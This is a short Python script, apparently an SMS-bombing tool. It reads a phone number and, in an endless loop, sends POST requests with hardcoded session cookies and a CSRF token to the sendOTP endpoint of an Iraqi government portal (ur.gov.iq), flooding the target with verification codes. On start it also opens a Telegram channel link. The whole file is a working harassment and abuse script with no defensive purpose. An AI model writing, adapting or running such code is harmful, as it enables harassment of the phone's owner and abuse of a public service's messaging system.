import requests
from user_agent import *
import os
import webbrowser
webbrowser.open('https://t.me/v3Python')


ab = input('Enter Your number => ')

os.system('clear')
def ss():
	while True:
		

		cookies = {
		    'cookiesession1': '678B2870DA7F388B52DEF252A454D0EF',
		    '_ga': 'GA1.1.322205443.1751367738',
		    '_ga_58SDZGZF8B': 'GS2.1.s1751367737$o1$g1$t1751367857$j43$l0$h0',
		}
		
		headers = {
		    'authority': 'ur.gov.iq',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    
		    'origin': 'https://ur.gov.iq',
		    'referer': 'https://ur.gov.iq/index/login',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': str(generate_user_agent()),
		    'x-csrf-token': 'R6B7hoBQd0wfG5Y6qOXHPNm4b9WKsTq6Vy6Jssxb',
		}
		
		json_data = {
		    'phone_num': ab,
		    'phone_code': '964',
		    'channel': 'phone',
		    'lang': 'ar',
		}
		
		re = requests.post('https://ur.gov.iq/api/user/sendOTP', cookies=cookies, headers=headers, json=json_data).text
		if "data" in re:
			print(True)
			
		else:
			print(False)
			
ss()

